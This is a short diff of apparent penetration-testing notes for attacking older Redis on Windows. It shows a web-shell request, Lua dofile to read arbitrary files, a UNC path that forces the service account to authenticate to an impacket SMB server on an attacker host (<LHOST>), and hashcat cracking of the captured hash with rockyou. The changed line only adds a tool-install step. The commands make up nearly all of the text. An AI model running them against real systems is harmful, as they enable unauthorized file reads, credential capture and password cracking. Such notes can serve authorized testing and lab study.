@@ -45,7 +45,7 @@ curl -s --output - '<Scheme>://<WebHost>/cmd.php?cmd=id'
 Older Redis on Windows runs Lua's dofile. Inside redis-cli, each \ in THE-FILE-PATH is written as four:
 EVAL "dofile('THE-FILE-PATH')" 0
 - [ ] The file's first line comes back in the error
-With the non-poisoning SMB listener from :Pb responder, a UNC path makes the service account log in to me:
+With the non-poisoning SMB listener from :Pb responder, after tool install impacket at the pwn-broker prompt, a UNC path makes the service account log in to me:
 sudo /opt/pwn-broker/bin/impacket-smbserver share . -smb2support
 EVAL "dofile('\\\\\\\\<LHOST>\\\\share\\\\x')" 0
 hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
